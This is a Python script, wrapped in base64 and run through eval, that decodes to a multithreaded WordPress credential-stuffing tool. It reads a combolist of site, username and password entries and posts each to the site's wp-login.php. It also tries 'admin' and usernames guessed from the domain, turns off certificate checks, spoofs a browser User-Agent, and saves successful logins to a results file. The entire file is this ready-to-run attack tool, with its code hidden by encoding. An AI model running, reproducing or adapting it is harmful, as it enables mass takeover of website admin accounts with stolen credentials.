#!/usr/bin/env python
import base64
unknownkece = """aW1wb3J0IHN5cw0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgcmUNCmltcG9ydCBvcw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IGFyZ3BhcnNlDQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBpbml0LCBTdHlsZQ0KZnJvbSB0YWJ1bGF0ZSBpbXBvcnQgdGFidWxhdGUNCmltcG9ydCBjb2xvcmVkbG9ncywgbG9nZ2luZw0KZnJvbSBtdWx0aXByb2Nlc3NpbmcuZHVtbXkgaW1wb3J0IFBvb2wNCg0KaW5pdChhdXRvcmVzZXQ9VHJ1ZSkNCmNvbG9yZWRsb2dzLmluc3RhbGwobGV2ZWw9J0lORk8nKQ0KbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoX19uYW1lX18pDQpyZXF1ZXN0cy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KDQojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICMNCg0KZGVmIGNsZWFyX3Rlcm1pbmFsKCk6DQogICAgIiIiQ2xlYXIgdGhlIHRlcm1pbmFsIHNjcmVlbiBiYXNlZCBvbiB0aGUgT1MuIiIiDQogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpDQoNCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gIw0KDQpkZWYgcHJpbnRfY29sb3JlZF9iYW5uZXIoYmFubmVyKToNCiAgICAiIiJQcmludCBlYWNoIGxpbmUgb2YgdGhlIGJhbm5lciBpbiBhIHJhbmRvbSBjb2xvciB3aXRob3V0IGEgcHJlZml4LiIiIg0KICAgIGZvciBsaW5lIGluIGJhbm5lci5zdHJpcCgpLnNwbGl0KCdcbicpOg0KICAgICAgICBjb2xvciA9IHJhbmRvbS5jaG9pY2UoW0ZvcmUuUkVELCBGb3JlLkdSRUVOLCBGb3JlLllFTExPVywgRm9yZS5CTFVFLCBGb3JlLk1BR0VOVEEsIEZvcmUuQ1lBTiwgRm9yZS5XSElURV0pDQogICAgICAgIHByaW50KGNvbG9yICsgbGluZSArIFN0eWxlLlJFU0VUX0FMTCkNCg0KDQpjbGVhcl90ZXJtaW5hbCgpDQpiYW5uZXIgPSAiIiINCuKWiOKWiOKVlyAgICDilojilojilZfilojilojilojilojilojilojilZcgICAgIOKWiOKWiOKVlyAgIOKWiOKWiOKVlyDilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilZcgICDilojilojilZcgICAg4paI4paI4pWXICDilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgDQrilojilojilZEgICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXICAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWRICAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4paI4paI4pWX4paI4paI4pWU4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXDQrilojilojilZEg4paI4pWXIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICDilojilojilZEgICDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkSAgICDilojilojilojilojilojilojilojilZHilojilojilojilojilojilojilojilZEg4pWa4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQ0K4paI4paI4pWR4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWdICAgICDilojilojilZEgICDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkSDilojilojilZTilojilojilZcg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXDQrilZrilojilojilojilZTilojilojilojilZTilZ3ilojilojilZEgICAgICAgICDilZrilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEg4pWa4paI4paI4paI4paI4pWRICAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZTilZ0g4paI4paI4pWX4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICDilojilojilZENCiDilZrilZDilZDilZ3ilZrilZDilZDilZ0g4pWa4pWQ4pWdICAgICAgICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ0gICAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVnQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoiIiINCnByaW50X2NvbG9yZWRfYmFubmVyKGJhbm5lcikNCg0KIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAjDQoNCmRlZiBnZXRfY2xlYW5fZG9tYWluKHNpdGUpOg0KICAgICIiIkV4dHJhY3QgZG9tYWluIG5hbWUgYnkgc3RyaXBwaW5nIHByb3RvY29sIGFuZCAnd3d3Jy4iIiINCiAgICByZXR1cm4gcmUuc3ViKHInXmh0dHBzPzovLyh3d3dcLik/JywgJycsIHNpdGUpLnNwbGl0KCcvJylbMF0NCg0KIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAjDQoNCmRlZiBnZXRfY29udGVudChyZXNwb25zZSk6DQogICAgIiIiRGVjb2RlIHJlc3BvbnNlIGNvbnRlbnQgd2l0aCBVVEYtOCBvciBmYWxsYmFjayB0byBwcmV2ZW50IFVuaWNvZGUgZXJyb3JzLiIiIg0KICAgIHRyeToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmNvbnRlbnQuZGVjb2RlKCd1dGYtOCcpDQogICAgZXhjZXB0IFVuaWNvZGVEZWNvZGVFcnJvcjoNCiAgICAgICAgcmV0dXJuIHN0cihyZXNwb25zZS5jb250ZW50LCAndXRmLTgnKQ0KDQojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICMNCg0KZGVmIGV4dHJhY3RfYmFzZV91cmwodXJsKToNCiAgICAiIiJFeHRyYWN0IGJhc2UgVVJMIHVwIHRvIGtub3duIGFkbWluIHBhdGhzIG9yIHJldHVybiBvcmlnaW5hbCBVUkwuIiIiDQogICAgdHJ5Og0KICAgICAgICByZXR1cm4gcmUubWF0Y2gocicoLiopKC93cC1sb2dpbi5waHB8L2FkbWlufC91c2VyKScsIHVybCkuZ3JvdXAoMSkgaWYgYW55KHAgaW4gdXJsIGZvciBwIGluIFsnL3dwLWxvZ2luLnBocCcsICcvYWRtaW4nLCAnL3VzZXInXSkgZWxzZSB1cmwNCiAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICBsb2dnZXIuZXJyb3IoIltXUC1DSEVDS0VSXTogRXJyb3IgaW4gZXh0cmFjdF9iYXNlX3VybCIpDQogICAgICAgIHJldHVybiBOb25lDQoNCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gIw0KDQpkZWYgd3BfbG9naW4oY3JlZGVudGlhbHMpOg0KICAgICIiIkF0dGVtcHQgdG8gbG9naW4gdG8gV29yZFByZXNzIHdpdGggcHJvdmlkZWQgY3JlZGVudGlhbHMuIiIiDQogICAgdHJ5Og0KICAgICAgICAjIFZhbGlkYXRlIGZvcm1hdA0KICAgICAgICBpZiAnIycgbm90IGluIGNyZWRlbnRpYWxzOg0KICAgICAgICAgICAgbG9nZ2VyLmVycm9yKGYie0ZvcmUuWUVMTE9XfVtXUC1DSEVDS0VSXTogSW52YWxpZCBmb3JtYXQ6IHtjcmVkZW50aWFsc317U3R5bGUuUkVTRVRfQUxMfSIpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgICAgICAjIFNwbGl0IGNyZWRlbnRpYWxzDQogICAgICAgIHVybCwgbG9naW5faW5mbyA9IGNyZWRlbnRpYWxzLnNwbGl0KCcjJywgMSkNCiAgICAgICAgaWYgJ0AnIG5vdCBpbiBsb2dpbl9pbmZvOg0KICAgICAgICAgICAgbG9nZ2VyLmVycm9yKGYie0ZvcmUuWUVMTE9XfVtXUC1DSEVDS0VSXTogSW52YWxpZCB1c2VybmFtZS9wYXNzd29yZCBmb3JtYXQ6IHtsb2dpbl9pbmZvfXtTdHlsZS5SRVNFVF9BTEx9IikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgICAgIHVzZXJuYW1lLCBwYXNzd29yZCA9IGxvZ2luX2luZm8uc3BsaXQoJ0AnLCAxKQ0KICAgICAgICANCiAgICAgICAgIyBDbGVhbiBhbmQgbm9ybWFsaXplIHRoZSBVUkwNCiAgICAgICAgdXJsID0gdXJsLnN0cmlwKCkNCiAgICAgICAgaWYgbm90IHVybC5zdGFydHN3aXRoKCgnaHR0cDovLycsICdodHRwczovLycpKToNCiAgICAgICAgICAgIHVybCA9ICdodHRwOi8vJyArIHVybA0KICAgICAgICB1cmwgPSBleHRyYWN0X2Jhc2VfdXJsKHVybCkNCg0KICAgICAgICAjIERlZmluZSBwb3RlbnRpYWwgdXNlcm5hbWVzIGZvciBXb3JkUHJlc3MgbG9naW4NCiAgICAgICAgcG9zc2libGVfdXNlcnMgPSBbdXNlcm5hbWUuc3BsaXQoJ0AnKVswXSwgJ2FkbWluJywgZ2V0X2NsZWFuX2RvbWFpbih1cmwpXQ0KICAgICAgICBpZiBsZW4odXJsLnNwbGl0KCcuJylbMF0pID4gODoNCiAgICAgICAgICAgIHBvc3NpYmxlX3VzZXJzLmluc2VydCgyLCB1cmwuc3BsaXQoJy4nKVswXVs6OF0pDQoNCiAgICAgICAgIyBBdHRlbXB0IGxvZ2luIHdpdGggZWFjaCBwb3NzaWJsZSB1c2VybmFtZQ0KICAgICAgICBmb3IgdXNlciBpbiBwb3NzaWJsZV91c2VyczoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICAgICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC44NSBTYWZhcmkvNTM3LjM2JywNCiAgICAgICAgICAgICAgICAgICAgJ1JlZmVyZXInOiBmJ3t1cmx9L3dwLWFkbWluLycNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgbG9naW5fZGF0YSA9IHsNCiAgICAgICAgICAgICAgICAgICAgJ2xvZyc6IHVzZXIsDQogICAgICAgICAgICAgICAgICAgICdwd2QnOiBwYXNzd29yZCwNCiAgICAgICAgICAgICAgICAgICAgJ3dwLXN1Ym1pdCc6ICdMb2cgSW4nLA0KICAgICAgICAgICAgICAgICAgICAncmVkaXJlY3RfdG8nOiBmJ3t1cmx9L3dwLWFkbWluLycNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAjIFBvc3QgdGhlIGxvZ2luIHJlcXVlc3QNCiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHNlc3Npb24ucG9zdChmJ3t1cmx9L3dwLWxvZ2luLnBocCcsIGRhdGE9bG9naW5fZGF0YSwgaGVhZGVycz1oZWFkZXJzLCB2ZXJpZnk9RmFsc2UsIHRpbWVvdXQ9MzApDQoNCiAgICAgICAgICAgICAgICAjIExvZyB0aGUgcmVzcG9uc2UgYmFzZWQgb24gcmVzdWx0DQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uub2s6DQogICAgICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBnZXRfY29udGVudChyZXNwb25zZSkNCiAgICAgICAgICAgICAgICAgICAgaWYgY29udGVudCBhbmQgKCd3cC1hZG1pbi9wcm9maWxlLnBocCcgaW4gY29udGVudCBvciAnd3AtYWRtaW4vdXBncmFkZS5waHAnIGluIGNvbnRlbnQpOg0KICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdSZXN1bHRzLnR4dCcsICdhJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYnVVJMOiB7dXJsfS93cC1sb2dpbi5waHBcblVzZXJuYW1lOiB7dXNlcn1cblBhc3N3b3JkOiB7cGFzc3dvcmR9XG5cbicpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIuaW5mbyhmIntGb3JlLllFTExPV31bV1AtQ0hFQ0tFUl06IHtGb3JlLldISVRFfXt1cmx9IHwge0ZvcmUuR1JFRU59e3VzZXJ9IHwge0ZvcmUuR1JFRU59e3Bhc3N3b3JkfSAtIHtGb3JlLk1BR0VOVEF9U3VjY2VlZGVkIExvZ2lue1N0eWxlLlJFU0VUX0FMTH0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2dlci5pbmZvKGYie0ZvcmUuWUVMTE9XfVtXUC1DSEVDS0VSXToge0ZvcmUuV0hJVEV9e3VybH0gfCB7Rm9yZS5HUkVFTn17dXNlcn0gfCB7Rm9yZS5HUkVFTn17cGFzc3dvcmR9IC0ge0ZvcmUuUkVEfUxvZ2luIEZhaWxlZHtTdHlsZS5SRVNFVF9BTEx9IikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIud2FybmluZyhmIntGb3JlLllFTExPV31bV1AtQ0hFQ0tFUl06IHtGb3JlLldISVRFfXt1cmx9IHwge0ZvcmUuR1JFRU59e3VzZXJ9IHwge0ZvcmUuR1JFRU59e3Bhc3N3b3JkfSAtIHtGb3JlLlJFRH1Mb2dpbiBGYWlsZWR7U3R5bGUuUkVTRVRfQUxMfSIpDQoNCiAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5SZXF1ZXN0RXhjZXB0aW9uIGFzIHJlcV9lcnJvcjoNCiAgICAgICAgICAgICAgICBsb2dnZXIuZXJyb3IoZiJ7Rm9yZS5ZRUxMT1d9W1dQLUNIRUNLRVJdOiB7Rm9yZS5XSElURX17dXJsfSB8IHtGb3JlLkdSRUVOfXt1c2VyfSB8IHtGb3JlLkdSRUVOfXtwYXNzd29yZH0gLSB7Rm9yZS5SRUR9TmV0d29yayBpc3N1ZXtTdHlsZS5SRVNFVF9BTEx9IikNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICBsb2dnZXIuZXJyb3IoZiJ7Rm9yZS5ZRUxMT1d9W1dQLUNIRUNLRVJdOiB7Rm9yZS5XSElURX17dXJsfSB8IHtGb3JlLkdSRUVOfXt1c2VyfSB8IHtGb3JlLkdSRUVOfXtwYXNzd29yZH0gLSB7Rm9yZS5SRUR9RXJyb3IgZHVyaW5nIGxvZ2luIGF0dGVtcHR7U3R5bGUuUkVTRVRfQUxMfSIpDQoNCiAgICBleGNlcHQgVmFsdWVFcnJvciBhcyBlOg0KICAgICAgICBsb2dnZXIuZXJyb3IoZiJ7Rm9yZS5ZRUxMT1d9W1dQLUNIRUNLRVJdOiBDcmVkZW50aWFscyBwYXJzaW5nIGVycm9yIC0ge2V9e1N0eWxlLlJFU0VUX0FMTH0iKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZ2VuX2Vycm9yOg0KICAgICAgICBsb2dnZXIuZXJyb3IoZiJ7Rm9yZS5SRUR9W1dQLUNIRUNLRVJdOiBHZW5lcmFsIGVycm9yIG9jY3VycmVkIC0ge2dlbl9lcnJvcn17U3R5bGUuUkVTRVRfQUxMfSIpDQoNCiAgICByZXR1cm4gRmFsc2UNCg0KIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAjDQoNCmRlZiBwcm9jZXNzX2NvbWJvKGNvbWJvX2xpbmUpOg0KICAgICIiIlByb2Nlc3MgZWFjaCBsaW5lIGluIHRoZSBjb21ibyBsaXN0LiIiIg0KICAgIGNvbWJvX2xpbmUgPSBjb21ib19saW5lLnN0cmlwKCkNCiAgICBsb2dnZXIuaW5mbyhmIltXUC1DSEVDS0VSXToge0ZvcmUuUkVEfVtFUlJPUl0ge2NvbWJvX2xpbmV9IikNCiAgICB3cF9sb2dpbihjb21ib19saW5lKQ0KDQojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICMNCg0KZGVmIG1haW4oYXJncyk6DQogICAgIiIiTWFpbiBmdW5jdGlvbiB0byBwcm9jZXNzIHRoZSBjb21ib2xpc3QuIiIiDQogICAgdGFyZ2V0X2ZpbGUgPSBhcmdzLmNvbWJvbGlzdA0KICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZSh0YXJnZXRfZmlsZSk6DQogICAgICAgIGxvZ2dlci5lcnJvcihmIltXUC1DSEVDS0VSXToge0ZvcmUuUkVEfSh7dGFyZ2V0X2ZpbGV9KSBGaWxlIGRvZXMgbm90IGV4aXN0IVxuIikNCiAgICAgICAgc3lzLmV4aXQoMCkNCg0KICAgIHdpdGggb3Blbih0YXJnZXRfZmlsZSwgJ3InKSBhcyB0YXJnZXQ6DQogICAgICAgIHBvb2wgPSBQb29sKGFyZ3MudGhyZWFkcykNCiAgICAgICAgcG9vbC5tYXAocHJvY2Vzc19jb21ibywgdGFyZ2V0KQ0KICAgICAgICBwb29sLmNsb3NlKCkNCiAgICAgICAgcG9vbC5qb2luKCkNCg0KIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAjDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IldvcmRQcmVzcyBMb2dpbiBDaGVja2VyIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctYycsICctLWNvbWJvbGlzdCcsIHJlcXVpcmVkPVRydWUsIGhlbHA9IlBhdGggdG8gdGhlIGNvbWJvbGlzdCBmaWxlIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctdCcsICctLXRocmVhZHMnLCB0eXBlPWludCwgZGVmYXVsdD01MCwgaGVscD0iTnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIChkZWZhdWx0OiA1MCkiKQ0KICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpDQogICAgbWFpbihhcmdzKQ=="""
eval(compile(base64.b64decode(unknownkece),"<string>","exec"))